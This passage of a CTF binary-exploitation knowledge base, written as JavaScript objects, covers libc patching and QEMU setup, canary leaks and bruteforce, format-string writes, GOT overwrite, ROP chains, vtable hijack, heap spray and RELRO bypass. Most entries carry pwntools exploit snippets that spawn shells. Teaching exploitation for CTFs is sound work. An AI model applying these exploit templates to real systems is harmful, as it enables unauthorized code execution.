sudo apt install patchelf
pip3 install pwninit

# Method 1: pwninit (recommended, auto-patches)
# Place in same directory:
#   challenge      (binary)
#   libc.so.6      (target libc)
#   ld-linux-x86-64.so.2  (target linker)
pwninit
# Creates: ./challenge_patched (uses local libc)

# Method 2: Manual patchelf
patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./binary
patchelf --set-rpath . ./binary

# Verify libc matches
ldd ./challenge_patched
# Should show: ./libc.so.6 as libc dependency

# Test locally with correct libc
from pwn import *
p = process('./challenge_patched')
# libc addresses now match remote!`,
        applicableLibc: 'All versions (must match remote)',
        references: [
          { description: 'pwninit GitHub', url: 'https://github.com/Gallopsled/pwninit' },
          { description: 'patchelf GitHub', url: 'https://github.com/NixOS/patchelf' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Binary runs with correct libc', 'ldd shows target libc path', 'Exploit offsets match remote'],
      artifacts: ['./challenge_patched binary', './libc.so.6 and ld-linux in same directory']
    },

    operatorChecklist: [
      '[ ] apt install patchelf && pip3 install pwninit',
      '[ ] Download target libc.so.6 and ld-linux from challenge',
      '[ ] Run pwninit in challenge directory',
      '[ ] Verify: ldd ./challenge_patched shows correct libc',
      '[ ] Test: run binary and verify libc version matches remote'
    ],

    vulnerabilityTypes: ['tool-setup', 'environment'],
    references: [
      { description: 'pwninit', url: 'https://github.com/Gallopsled/pwninit' },
      { description: 'patchelf', url: 'https://github.com/NixOS/patchelf' }
    ]
  },

  setup_qemu: {
    id: 'setup_qemu',
    name: 'QEMU + gdb-multiarch Setup',
    category: 'setup',
    class: 'tool-setup',
    description: 'Install QEMU user-mode emulator and gdb-multiarch for cross-architecture pwn challenges (ARM, MIPS, AArch64). Run and debug non-x86 binaries locally.',

    preconditions: {
      summary: 'Cross-architecture CTF challenges require QEMU to emulate and gdb-multiarch to debug ARM/MIPS/AArch64 binaries.',
      required: [
        'QEMU user-mode emulator packages',
        'gdb-multiarch for debugging',
        'Target architecture binutils for pwntools ASM/shellcraft',
        'Target libc.so and ld-linux if provided'
      ],
      detectionSteps: [
        'qemu-arm ./arm_binary (test ARM emulation)',
        'qemu-aarch64 ./aarch64_binary (test AArch64)',
        'gdb-multiarch ./arm_binary (test cross-arch debugging)'
      ]
    },

    exploitationPaths: [
      {
        name: 'Full Cross-Arch Environment Setup',
        description: 'Install QEMU, gdb-multiarch, and cross-architecture toolchain for ARM/MIPS debugging.',
        steps: [
          'sudo apt install qemu-user qemu-user-static gdb-multiarch',
          'Install cross binutils: apt install binutils-arm-linux-gnueabihf binutils-mips-linux-gnu',
          'Test: qemu-arm -L /usr/arm-linux-gnueabihf ./arm_binary',
          'Debug: qemu-arm -g 1234 ./arm_binary & then gdb-multiarch → target remote :1234',
          'pwntools: use context.arch = "arm" and process(["qemu-arm", ...])'
        ],
        tools: ['qemu-user', 'gdb-multiarch', 'pwntools'],
        codeSnippet: `# Install QEMU + cross-arch tools
sudo apt install qemu-user qemu-user-static gdb-multiarch \\
  binutils-arm-linux-gnueabihf \\
  binutils-mips-linux-gnu \\
  binutils-aarch64-linux-gnu

# Run ARM binary locally
qemu-arm -L /usr/arm-linux-gnueabihf ./arm_binary

# Debug ARM binary with GDB
qemu-arm -g 1234 ./arm_binary &
gdb-multiarch ./arm_binary
# (gdb) set architecture arm
# (gdb) target remote :1234

# pwntools integration for cross-arch
from pwn import *
context.arch = 'arm'  # or 'mips', 'aarch64'
context.binary = ELF('./arm_binary')
p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabihf', './arm_binary'])
# Or with GDB:
p = gdb.debug('./arm_binary', arch='arm')`,
        applicableLibc: 'N/A (emulation tool)',
        references: [
          { description: 'QEMU User Mode Docs', url: 'https://www.qemu.org/docs/master/user/main.html' },
          { description: 'pwn docker setup', url: 'https://github.com/Gallopsled/pwntools/tree/dev/pwnlib/data' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['qemu-arm runs ARM binary', 'gdb-multiarch connects to QEMU stub', 'pwntools process launches with qemu-arm'],
      artifacts: ['qemu-user installed', 'gdb-multiarch installed', 'cross-arch binutils installed']
    },

    operatorChecklist: [
      '[ ] apt install qemu-user qemu-user-static gdb-multiarch',
      '[ ] Install cross-architecture binutils',
      '[ ] Test: qemu-arm with ARM test binary',
      '[ ] Test: gdb-multiarch → target remote :1234',
      '[ ] Configure pwntools context.arch for target'
    ],

    vulnerabilityTypes: ['tool-setup', 'cross-architecture'],
    references: [
      { description: 'QEMU Documentation', url: 'https://www.qemu.org/docs/master/user/main.html' }
    ]
  },

  // ─── DETAILED KB ENTRIES FOR PREVIOUSLY GENERIC-MAPPED TECHNIQUES ───

  canary_leak: {
    id: 'canary_leak',
    name: 'Canary Leak',
    category: 'technique',
    class: 'Defense Bypass',
    description: 'Reading the stack canary value through an information disclosure primitive (format string, OOB read) before overwriting it. Once leaked, the canary can be placed back into the overflow payload at the correct offset, bypassing __stack_chk_fail entirely.',
    preconditions: {
      summary: 'A read primitive exists that can reach the canary on the stack. Most commonly: a format string specifier (%p, %x) that prints stack values, or an out-of-bounds read that reaches the canary\'s position.',
      required: [
        'Stack canary enabled (checksec shows Canary: yes)',
        'Read primitive: format string, OOB read, or uninitialized stack read',
        'Knowledge of canary position relative to buffer (typically at rbp-8 on x86_64)',
      ],
      detectionSteps: [
        'checksec --file=./binary → confirm canary',
        'In GDB: canary → prints the canary value and offset from RBP',
        'Run with format string input: echo "%15$p" | ./binary → look for 0xXXXXXXXXXX ending in \\x00',
        'Canary value always ends in a NULL byte (LSB) on Linux — confirms you found it',
      ],
      offsetDiscovery: {
        'pwntools': 'Canary offset = (rbp_offset - 8)',
        'pwndbg': 'canary → shows offset from stack top',
      },
    },
    exploitationPaths: [
      {
        name: 'Format String Canary Leak',
        description: 'Use printf format specifiers to read the canary from the stack.',
        steps: [
          'Send format string probe: "%p %p %p %p..." or use pwntools FmtStr',
          'Identify the canary value (always ends in 0x00)',
          'Calculate canary offset on stack',
          'Include canary at correct position in overflow payload',
        ],
        tools: ['pwntools FmtStr', 'pwndbg canary', 'GDB'],
        codeSnippet: `from pwn import *
p = process('./binary')
# Leak canary at offset N
p.sendlineafter(b'> ', b'%15$p')
canary = int(p.recvline().strip(), 16)
log.info(f'Canary: {hex(canary)}')

# Build overflow payload with canary
payload = b'A' * offset + p64(canary) + b'B' * 8 + p64(rip)
p.sendline(payload)`,
        references: [{ description: 'Format string canary leak technique' }],
      },
      {
        name: 'OOB Read / Uninitialized Stack Leak',
        description: 'If the binary prints back stack content (e.g., prints buffer contents including adjacent bytes), the canary may be leaked.',
        steps: [
          'Fill buffer up to but not past the canary',
          'Binary prints buffer content → canary bytes visible',
          'Parse the canary value from output',
          'Use canary in overflow payload',
        ],
        tools: ['pwntools', 'GDB', 'pwndbg telescope'],
        codeSnippet: `# If binary does: write(1, buf, len) where len includes stack junk
# Send exactly buffer_size bytes to avoid canary corruption
# The output may contain canary bytes after the buffer
p.send(b'A' * buf_size)
leak = p.recv(buf_size + 8)  # canary is 8 bytes past buffer
canary = u64(leak[buf_size:buf_size+8])
log.info(f'Leaked canary: {hex(canary)}')`,
        references: [{ description: 'Stack leak via OOB read' }],
      },
    ],
    postconditions: {
      successIndicators: ['Canary value obtained ending in 0x00', 'Overflow payload does not trigger __stack_chk_fail'],
      artifacts: ['Leaked canary value', 'Offset from buffer start to canary'],
    },
    operatorChecklist: [
      '[ ] Confirm canary is enabled with checksec',
      '[ ] Find format string offset or OOB read that reaches canary',
      '[ ] Leak and verify canary (ends in NULL byte on Linux)',
      '[ ] Place canary in overflow payload at correct offset',
      '[ ] Verify no crash on return (canary bypass successful)',
    ],
    vulnerabilityTypes: ['stack-overflow', 'format-string', 'info-leak'],
    references: [
      { description: 'Stack Canaries (CTF 101)', url: 'https://ctf101.org/binary-exploitation/stack-canaries/' },
      { description: 'pwndbg canary command', url: 'https://github.com/pwndbg/pwndbg' },
    ],
  },

  canary_bruteforce: {
    id: 'canary_bruteforce',
    name: 'Canary Bruteforce',
    category: 'technique',
    class: 'Defense Bypass',
    description: 'Byte-by-byte brute force of the stack canary in a forking server where child processes inherit the canary from the parent. Each byte can be tested individually because the canary is invariant across fork() calls, and a wrong byte causes the child to crash (which the parent survives).',
    preconditions: {
      summary: 'The target is a forking network server: fork() is called after accept(), so each connection gets the same canary. We test one byte at a time — 256 attempts per byte × 8 bytes = 2048 connections worst case.',
      required: [
        'Forking server (parent survives child crashes)',
        'Buffer overflow that overwrites past canary position',
        'Ability to detect crash vs. no-crash (oracle)',
        'Canary does not change between connections (no atfork handler re-randomizing)',
      ],
      detectionSteps: [
        'Connect to remote, send overflow → connection closes (canary corrupted)',
        'Reconnect immediately → server still up (forking confirmed)',
        'Send 7 + 0x00 → if no crash, first byte is 0x00 (canary LSB is always 0x00 on Linux)',
        'Iterate: 7 + known + byte_N → 256 attempts per byte position',
      ],
    },
    exploitationPaths: [
      {
        name: 'Byte-by-Byte Canary Brute Force',
        description: 'Test each byte of the canary individually, leveraging fork() to keep the parent alive.',
        steps: [
          'Confirm canary LSB is 0x00 (Linux convention — skip first byte)',
          'For each byte position (1-7): try all 256 values',
          'No crash → correct byte; crash → wrong byte, try next',
          'Assemble recovered canary and use in final overflow',
        ],
        tools: ['pwntools', 'netcat', 'custom brute script'],
        codeSnippet: `from pwn import *

def bruteforce_canary(host, port, offset):
    canary = b'\\x00'  # LSB is always 0x00 on Linux
    for byte_pos in range(1, 8):
        for byte_val in range(256):
            p = remote(host, port)
            p.recvuntil(b'> ')
            payload = b'A' * offset + canary + bytes([byte_val])
            try:
                p.send(payload)
                response = p.recv(timeout=2)
                canary += bytes([byte_val])
                p.close()
                log.success(f'Byte {byte_pos}: 0x{byte_val:02x}')
                break
            except:
                p.close()
                continue
    return canary

canary = bruteforce_canary('target', 9999, 64)
log.info(f'Recovered canary: {canary.hex()}')`,
        references: [{ description: 'Canary bruteforce technique for forking servers' }],
      },
    ],
    postconditions: {
      successIndicators: ['Canary recovered (8 bytes ending in 0x00)', 'Overflow payload with canary does not trigger crash'],
      artifacts: ['Recovered canary bytes', 'Confirmation of forking server model'],
    },
    operatorChecklist: [
      '[ ] Confirm server forks on each connection',
      '[ ] Find offset from buffer to canary',
      '[ ] Remember canary LSB is always 0x00 on Linux',
      '[ ] Brute force remaining 7 bytes (256 attempts each)',
      '[ ] Use recovered canary in final exploit',
    ],
    vulnerabilityTypes: ['stack-overflow', 'bruteforce', 'canary-bypass'],
    references: [
      { description: 'Forking server canary brute force' },
    ],
  },

  format_string_detailed: {
    id: 'format_string_detailed',
    name: 'Format String Vulnerability (Detailed)',
    category: 'technique',
    class: 'Memory Corruption',
    description: 'When user input is passed directly as the format string argument to printf/fprintf/sprintf, the attacker can use format specifiers (%x, %p, %n, %s) to read arbitrary stack/memory values and write arbitrary values to memory. This is one of the most versatile bugs — enabling info leak, GOT overwrite, canary leak, and arbitrary write, all from a single vulnerability.',
    preconditions: {
      summary: 'A function in the printf family uses user-controlled input as the format string argument. This is typically: printf(user_buf) instead of printf("%s", user_buf).',
      required: [
        'printf(), sprintf(), fprintf(), or snprintf() with user input as format string',
        'Direct input flow from attacker to format argument (no sanitizer)',
        'Output channel back to attacker (for leak), or crash oracle (for blind)',
      ],
      detectionSteps: [
        'Send %p.%p.%p.%p — if you see hex values, format string confirmed',
        'Send %x — look for hex output',
        'Send %s — may crash (dereferencing arbitrary pointer)',
        'Send %% — should print a single % (confirms format processing)',
        'Use ltrace to see: printf(user_buf) vs printf("%s", user_buf)',
      ],
      offsetDiscovery: {
        'pwntools': 'fmtstr_payload(offset, {target: value})',
        'manual': 'Send %1$p %2$p %3$p... until you see your input',
        'pwndbg': 'printf-args command',
      },
    },
    exploitationPaths: [
      {
        name: 'Format String Leak (Read)',
        description: 'Use %p, %x, %s to leak stack values, canary, libc pointers, and heap addresses.',
        steps: [
          'Find format string offset with cyclic input',
          'Leak canary: position N on stack where canary resides',
          'Leak libc: position where return address or GOT entry resides',
          'Leak heap: position where heap pointer resides',
        ],
        tools: ['pwntools fmtstr', 'GDB', 'ltrace'],
        codeSnippet: `from pwn import *
p = process('./vuln')
# Leak canary at stack offset 15
p.sendlineafter(b'> ', b'%15$p')
canary = int(p.recvline().strip(), 16)

# Leak libc return address
p.sendlineafter(b'> ', b'%41$p')
libc_leak = int(p.recvline().strip(), 16)
libc_base = libc_leak - OFFSET`,
        applicableLibc: 'All',
        references: [{ description: 'Format String 101' }],
      },
      {
        name: 'Format String Write (GOT Overwrite)',
        description: 'Use %n and %hn to write arbitrary values to GOT entries, redirecting function calls.',
        steps: [
          'Find format string offset with AAAA%X$p',
          'Calculate target GOT address (e.g., puts@GOT)',
          'Calculate value to write (e.g., system address)',
          'Use pwntools fmtstr_payload to build the write',
        ],
        tools: ['pwntools fmtstr_payload', 'objdump', 'readelf'],
        codeSnippet: `from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# Write system to puts@GOT
writes = {elf.got['puts']: libc.sym['system']}
payload = fmtstr_payload(OFFSET, writes, write_size='short')
p.sendline(payload)

# Now when program calls puts(user_input), it calls system(user_input)
p.sendline(b'/bin/sh')`,
        applicableLibc: 'All (with Partial/No RELRO)',
        references: [{ description: 'pwntools fmtstr documentation' }],
      },
    ],
    postconditions: {
      successIndicators: ['Format specifiers produce hex/pointer output', 'GOT entries overwritten to target addresses'],
      artifacts: ['Format string offset', 'Leaked addresses (canary, libc, heap)'],
    },
    operatorChecklist: [
      '[ ] Confirm format string with %p.%p or %x',
      '[ ] Find format string offset using AAAA%N$p',
      '[ ] Determine read/write capability (%p for read, %n for write)',
      '[ ] Check RELRO: Full RELRO blocks GOT writes',
      '[ ] If Partial/No RELRO: plan GOT overwrite with fmtstr_payload',
      '[ ] If Full RELRO: target __malloc_hook, __free_hook, or FSOP',
    ],
    vulnerabilityTypes: ['format-string', 'info-leak', 'arbitrary-write'],
    references: [
      { description: 'Format String Vulnerabilities (CTF 101)', url: 'https://ctf101.org/binary-exploitation/format-string/' },
      { description: 'pwntools fmtstr', url: 'https://docs.pwntools.com/en/stable/fmtstr.html' },
    ],
  },

  got_overwrite: {
    id: 'got_overwrite',
    name: 'GOT Overwrite',
    category: 'technique',
    class: 'Control Flow Hijack',
    description: 'Overwriting a Global Offset Table (GOT) entry to redirect a function call to an attacker-controlled address. The GOT stores resolved addresses for dynamically-linked functions — if writable, changing puts@GOT to system() means the next call to puts() executes system(). Works with any write primitive: format string %n, heap arbitrary write, or direct memory write.',
    preconditions: {
      summary: 'A write primitive exists that can target the GOT. Partial RELRO or No RELRO means the GOT is writable. Full RELRO makes the GOT read-only after resolution, blocking this attack.',
      required: [
        'Write primitive: format string, heap write, or arbitrary write',
        'GOT entry at known address (No PIE or PIE bypassed)',
        'Partial RELRO or No RELRO (Full RELRO blocks this)',
        'Target function address (e.g., system in libc)',
      ],
      detectionSteps: [
        'checksec → check RELRO status (No/Partial = writable)',
        'readelf -r ./binary | grep GOT → find GOT entries',
        'objdump -d ./binary | grep plt → find PLT/GOT pairs',
        'Identify which GOT entry to target (commonly: puts, printf, free)',
      ],
      offsetDiscovery: {
        'pwntools': 'elf.got["puts"], libc.sym["system"]',
        'readelf': 'readelf -r ./binary | grep puts',
        'objdump': 'objdump -d ./binary | grep "@plt>"',
      },
    },
    exploitationPaths: [
      {
        name: 'Format String GOT Overwrite',
        description: 'Use %hn (short write) to overwrite a GOT entry byte-by-byte via format string.',
        steps: [
          'Find GOT entry address for target function',
          'Find replacement function address (e.g., system)',
          'Calculate short writes needed for each 2 bytes',
          'Build fmtstr_payload with target address',
        ],
        tools: ['pwntools fmtstr_payload', 'readelf', 'objdump'],
        codeSnippet: `from pwn import *
writes = {elf.got['puts']: libc.sym['system']}
payload = fmtstr_payload(OFFSET, writes, write_size='short')
p.sendline(payload)
p.sendline(b'/bin/sh')`,
        applicableLibc: 'All (Partial/No RELRO)',
      },
      {
        name: 'Heap Arbitrary Write → GOT Overwrite',
        description: 'After obtaining an arbitrary write through heap exploitation (tcache poison, fastbin dup, etc.), write system to a GOT entry.',
        steps: [
          'Obtain arbitrary write via heap technique',
          'Calculate GOT entry address and system() address',
          'Write system address to GOT entry',
          'Trigger the hijacked function call',
        ],
        tools: ['pwndbg', 'pwntools', 'one_gadget'],
        codeSnippet: `# After tcache poison or similar gives arbitrary write
arb_write(elf.got['free'], libc.sym['system'])
free(buf_containing_binsh)  # → system("/bin/sh")`,
        applicableLibc: 'glibc < 2.34 (hooks available), any (GOT overwrite)',
      },
    ],
    postconditions: {
      successIndicators: ['GOT entry overwritten with target address', 'Hijacked function call executes with attacker arguments'],
      artifacts: ['Target function GOT address', 'Replacement function libc offset'],
    },
    operatorChecklist: [
      '[ ] Check RELRO status: only Partial or No RELRO allows GOT writes',
      '[ ] Identify target GOT entry (puts, printf, free, etc.)',
      '[ ] Find replacement function offset in libc',
      '[ ] Build write payload (format string or heap arbitrary write)',
      '[ ] Trigger hijacked function with desired argument',
    ],
    vulnerabilityTypes: ['format-string', 'arbitrary-write', 'got-overwrite'],
    references: [
      { description: 'GOT Overwrite technique' },
      { description: 'PLT/GOT internals' },
    ],
  },

  rop_chain_detailed: {
    id: 'rop_chain_detailed',
    name: 'ROP Chain (Detailed)',
    category: 'technique',
    class: 'Code Reuse',
    description: 'Return-Oriented Programming chains together short sequences of instructions ending in "ret" (called gadgets) from existing executable memory to perform arbitrary computation. Each gadget pops values into registers, calls functions, or sets up arguments. The chain is placed on the stack, and when the function returns, execution flows through the gadgets in sequence.',
    preconditions: {
      summary: 'A stack buffer overflow with sufficient overflow space (4-8+ register setups). The binary must have executable code segments with useful gadgets. NX must be enabled (otherwise just use shellcode).',
      required: [
        'Stack buffer overflow with control over RIP',
        'Sufficient overflow space (usually 40-200+ bytes)',
        'Executable memory (binary, libc) containing gadgets',
        'Knowledge of gadget addresses (No PIE or address leak)',
      ],
      detectionSteps: [
        'ROPgadget --binary ./binary → find pop rdi; ret and other gadgets',
        'ropper --file ./binary --search "pop rdi"',
        'In pwntools: ROP(elf) for automatic chain building',
        'Check if binary has useful functions: system(), execve()',
      ],
      offsetDiscovery: {
        'ROPgadget': 'ROPgadget --binary ./binary | grep "pop rdi"',
        'ropper': 'ropper --file ./binary --search "pop rdi"',
        'pwntools': 'rop = ROP(elf); rop.call("system", [next(elf.search(b"/bin/sh"))])',
      },
    },
    exploitationPaths: [
      {
        name: 'Simple ret2libc via ROP',
        description: 'Pop /bin/sh into rdi, then call system(). Classic ret2libc via ROP gadgets.',
        steps: [
          'Find offset to RIP using cyclic pattern',
          'Find "pop rdi; ret" gadget address',
          'Find "/bin/sh" string address in libc',
          'Find system() address in libc',
          'Chain: padding + pop_rdi + &"/bin/sh" + system',
        ],
        tools: ['pwntools ROP', 'ROPgadget', 'one_gadget', 'ropper'],
        codeSnippet: `from pwn import *
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # for stack alignment

payload = b'A' * offset
payload += p64(ret)          # stack alignment
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])`,
        applicableLibc: 'All (dynamically linked)',
      },
      {
        name: 'ret2syscall (Static Binary)',
        description: 'For statically linked binaries with no libc: chain syscall gadgets to set rax=59 (execve), rdi="/bin/sh", rsi=0, rdx=0, then syscall.',
        steps: [
          'Find gadgets: pop rax; ret, pop rdi; ret, pop rsi; ret, pop rdx; ret, syscall; ret',
          'Write /bin/sh string to known writable address',
          'Chain all register pop gadgets + syscall',
        ],
        tools: ['ROPgadget', 'ropper', 'pwntools'],
        codeSnippet: `from pwn import *
pop_rax = 0x??????
pop_rdi = 0x??????
pop_rsi = 0x??????
pop_rdx = 0x??????
syscall_ret = 0x??????
writable = 0x??????

payload = b'A' * offset
payload += p64(pop_rax) + p64(59)   # SYS_execve
payload += p64(pop_rdi) + p64(writable)  # &"/bin/sh"
payload += p64(pop_rsi) + p64(0)     # argv = NULL
payload += p64(pop_rdx) + p64(0)     # envp = NULL
payload += p64(syscall_ret)`,
        applicableLibc: 'Static binary (no libc)',
      },
    ],
    postconditions: {
      successIndicators: ['Shell spawned', 'Function called with attacker-controlled arguments'],
      artifacts: ['Gadget addresses', 'Pop chain offsets', 'Libc base address'],
    },
    operatorChecklist: [
      '[ ] Find offset to RIP with cyclic pattern',
      '[ ] Check if libc leak is needed (PIE/ASLR)',
      '[ ] Find pop rdi; ret gadget',
      '[ ] Find system() or execve() address',
      '[ ] Add ret gadget for 16-byte stack alignment',
      '[ ] Build chain and send payload',
    ],
    vulnerabilityTypes: ['stack-overflow', 'rop', 'code-reuse'],
    references: [
      { description: 'Return Oriented Programming (CTF 101)', url: 'https://ctf101.org/binary-exploitation/return-oriented-programming/' },
      { description: 'ROPgadget', url: 'https://github.com/JonathanSalwan/ROPgadget' },
    ],
  },

  vtable_hijack_detailed: {
    id: 'vtable_hijack_detailed',
    name: 'VTable Hijack (Detailed)',
    category: 'technique',
    class: 'Control Flow Hijack',
    description: 'In C++ binaries, virtual function calls go through a vtable pointer stored at the start of each object. After a use-after-free, the attacker can overwrite the vtable pointer to point to a fake vtable under their control. When the program calls a virtual method on the dangling pointer, it dispatches through the fake vtable, executing attacker-chosen code. Modern glibc validates vtable pointers against known ranges, making the _IO_FILE vtable attack require targeting _IO_wstr_jumps/_IO_wfile_jumps instead.',
    preconditions: {
      summary: 'A use-after-free on a C++ object with virtual methods. After freeing the object, the attacker reallocates controlled data over the freed slot, overwrites the vtable pointer, and triggers a virtual function call.',
      required: [
        'C++ object with virtual methods (vtable pointer at offset 0)',
        'Use-after-free or type confusion allowing vtable overwrite',
        'Ability to reallocate same-size object over freed slot',
        'Trigger for virtual method call on the dangling pointer',
      ],
      detectionSteps: [
        'Run in GDB: info vtbl <class_name> → see vtable layout',
        'Look for virtual keyword in source or vptr in Ghidra',
        'Free + allocate same size → type confusion',
        'Trigger virtual call: dangling_ptr->virtual_method()',
      ],
    },
    exploitationPaths: [
      {
        name: 'UAF → Fake Vtable → Code Execution',
        description: 'Free C++ object, reallocate with controlled data, point vtable to controlled memory containing a function pointer.',
        steps: [
          'Free the C++ object (dangling pointer created)',
          'Allocate string or buffer of same size over freed slot',
          'Write fake vtable pointer at offset 0 pointing to attacker-controlled area',
          'At fake vtable offset N, write target function address (e.g., system)',
          'Trigger virtual call: program calls dangling_ptr->method() → calls system()',
        ],
        tools: ['pwndbg', 'pwntools', 'Ghidra'],
        codeSnippet: `# UAF → VTable Hijack
obj = allocate_object()     # allocate C++ object with vtable
free(obj)                    # free it (dangling pointer)
fake = allocate_same_size() # reallocate with attacker data

# Overwrite vtable pointer
write_qword(fake + 0x00, fake_vtable_addr)
# Set virtual method entry to system
write_qword(fake_vtable_addr + METHOD_OFFSET, libc.sym['system'])

# Trigger virtual call → system() runs
trigger_virtual_call()`,
        applicableLibc: 'All (glibc < 2.28 easiest)',
      },
    ],
    postconditions: {
      successIndicators: ['Virtual method call diverted to attacker function', 'Shell spawned or code execution achieved'],
      artifacts: ['Vtable address', 'Virtual method offset', 'Replacement function address'],
    },
    operatorChecklist: [
      '[ ] Identify C++ class with virtual methods',
      '[ ] Find vtable pointer offset (usually 0)',
      '[ ] Find virtual method offset in vtable',
      '[ ] Free object and reallocate controlled data',
      '[ ] Write fake vtable pointer',
      '[ ] Write target function at method offset in fake vtable',
      '[ ] Trigger virtual call on dangling pointer',
    ],
    vulnerabilityTypes: ['use-after-free', 'vtable-hijack', 'cpp-exploit'],
    references: [
      { description: 'C++ vtable exploitation' },
    ],
  },

  heap_spray_detailed: {
    id: 'heap_spray_detailed',
    name: 'Heap Spray (Detailed)',
    category: 'technique',
    class: 'Memory Layout Control',
    description: 'Allocates massive amounts of heap memory filled with a predictable pattern (often NOP sled + shellcode) to place attacker data at a known or guessable address. Used when the attacker knows a jump/call target address but cannot control what is at that address. Commonly paired with use-after-free, vtable hijack, or ROP where a fixed address is needed.',
    preconditions: {
      summary: 'The attacker can allocate many heap objects of controlled content and size. Often used with UAF or format string bugs where a pointer needs to point to attacker-controlled data at a predictable address.',
      required: [
        'Ability to allocate large numbers of heap objects',
        'Control over content of allocated objects',
        'Target address that is predictable (no PIE or leaked address)',
      ],
      detectionSteps: [
        'Check if binary allows large allocations (malloc loops)',
        'Determine if ASLR can be bypassed (no PIE, or info leak)',
        'Test with spray pattern: 0x41414141 repeated → check with GDB vmmap',
      ],
    },
    exploitationPaths: [
      {
        name: 'NOP Sled + Shellcode Heap Spray',
        description: 'Spray heap with NOP sled followed by shellcode, then jump to a predicted address.',
        steps: [
          'Prepare spray payload: NOP sled (0x90) + shellcode + padding',
          'Allocate thousands of spray objects to fill the address space',
          'Predict address: typically heap_base + offset (try multiple)',
          'Jump to predicted address via UAF/vtable/dangling pointer',
        ],
        tools: ['pwntools', 'pwndbg vmmap'],
        codeSnippet: `from pwn import *

shellcode = asm(shellcraft.sh())
nop_sled = b'\\x90' * 0x100
spray_payload = nop_sled + shellcode
spray_payload = spray_payload.ljust(0x400, b'\\x00')

# Spray 10000 allocations
for i in range(10000):
    spray_chunk = malloc(len(spray_payload))
    write(spray_chunk, spray_payload)

# Predict address (check with GDB vmmap)
predicted_addr = heap_base + 0x1000
# Use predicted_addr as jump target in exploit`,
        applicableLibc: 'All (no PIE / ASLR disabled easiest)',
      },
    ],
    postconditions: {
      successIndicators: ['Predictable address contains attacker data', 'Jump to sprayed address executes shellcode or ROP'],
      artifacts: ['Sprayed address range', 'Heap base address'],
    },
    operatorChecklist: [
      '[ ] Determine if ASLR is disabled or address is leakable',
      '[ ] Prepare spray payload (NOP sled + payload)',
      '[ ] Allocate enough to cover target address region',
      '[ ] Verify with GDB: examine memory at predicted address',
      '[ ] Jump to predicted address via exploit primitive',
    ],
    vulnerabilityTypes: ['heap-spray', 'uaf', 'vtable-hijack'],
    references: [
      { description: 'Heap Spray technique' },
    ],
  },

  relational_bypass: {
    id: 'relational_bypass_detailed',
    name: 'RELRO Bypass (Detailed)',
    category: 'technique',
    class: 'Defense Bypass',
    description: 'Bypassing RELRO (Relocation Read-Only) protection. Full RELRO makes the GOT read-only after startup, blocking classic GOT overwrite attacks. No RELRO and Partial RELRO leave the GOT writable. With Full RELRO, attackers must target other writable function pointers: __malloc_hook, __free_hook (glibc < 2.34), or use FSOP (File Stream Oriented Programming) to corrupt _IO_FILE vtables.',
    preconditions: {
      summary: 'Identify RELRO level and choose appropriate bypass. With Full RELRO, the standard GOT overwrite path is closed — must find alternative targets.',
      required: [
        'checksec to determine RELRO level',
        'For Full RELRO: writable hook pointers or _IO_FILE structures',
        'Arbitrary write primitive',
      ],
      detectionSteps: [
        'checksec --file=./binary → check RELRO status',
        'No RELRO: entire .got.plt is writable — easy GOT overwrite',
        'Partial RELRO: .got.plt writable, .got read-only — GOT overwrite still works',
        'Full RELRO: entire GOT is read-only (mprotect) — need alternative target',
        'readelf -d ./binary | grep BIND_NOW → Full RELRO indicator',
      ],
    },
    exploitationPaths: [
      {
        name: 'No/Partial RELRO: GOT Overwrite',
        description: 'Direct GOT entry overwrite — the classic approach.',
        steps: [
          'Find target GOT entry (puts, printf, free, etc.)',
          'Find replacement function address',
          'Write replacement address to GOT entry',
          'Trigger the hijacked function',
        ],
        tools: ['pwntools', 'readelf', 'objdump'],
        codeSnippet: `# Direct GOT overwrite (No/Partial RELRO)
writes = {elf.got['puts']: libc.sym['system']}
payload = fmtstr_payload(offset, writes)
p.sendline(payload)`,
        applicableLibc: 'All (No/Partial RELRO)',
      },
      {
        name: 'Full RELRO: __malloc_hook / __free_hook',
        description: 'Bypass Full RELRO by overwriting libc hook pointers that are still writable (glibc < 2.34).',
        steps: [
          'Leak libc base address',
          'Find __malloc_hook or __free_hook address in libc',
          'Write one_gadget address to the hook',
          'Trigger malloc() or free() to execute the hook',
        ],
        tools: ['pwntools', 'one_gadget', 'pwndbg'],
        codeSnippet: `# Hook overwrite (Full RELRO, glibc < 2.34)
malloc_hook = libc.sym['__malloc_hook']
one_gadget = 0x??????  # from one_gadget tool

arb_write(malloc_hook, one_gadget)
trigger_malloc(1)  # → calls __malloc_hook → one_gadget → shell`,
        applicableLibc: 'glibc < 2.34 (hooks removed in 2.34+)',
      },
      {
        name: 'Full RELRO: FSOP / House of Apple',
        description: 'For modern glibc (2.34+), hooks are gone. Use FSOP or House of Apple to redirect execution through corrupted _IO_FILE structs.',
        steps: [
          'Forge or corrupt an _IO_FILE structure',
          'Point _wide_data to attacker-controlled memory',
          'Set vtable to _IO_wfile_jumps (within valid range)',
          'Trigger exit() or assert to invoke _IO_flush_all_lockp',
        ],
        tools: ['pwntools', 'pwndbg'],
        codeSnippet: `# FSOP / House of Apple (glibc 2.34+)
# Modify _IO_FILE._wide_data to point to fake struct
# Set vtable to _IO_wfile_jumps + offset
# Trigger: exit() or assert failure → vtable dispatch → code exec`,
        applicableLibc: 'glibc 2.34+ (post-hook era)',
      },
    ],
    postconditions: {
      successIndicators: [
        'No/Partial: GOT entry overwritten, function hijacked',
        'Full (hooks): One gadget executed on malloc/free trigger',
        'Full (FSOP): Code execution via _IO_FILE corruption',
      ],
      artifacts: ['RELRO level', 'Target address used', 'Libc base address'],
    },
    operatorChecklist: [
      '[ ] Run checksec to identify RELRO level',
      '[ ] No/Partial RELRO: plan GOT overwrite',
      '[ ] Full RELRO + glibc < 2.34: check for __malloc_hook/__free_hook',
      '[ ] Full RELRO + glibc >= 2.34: plan FSOP / House of Apple',
      '[ ] Leak libc base before attempting hook/FSOP overwrite',
    ],
    vulnerabilityTypes: ['relro-bypass', 'got-overwrite', 'fsop'],
    references: [
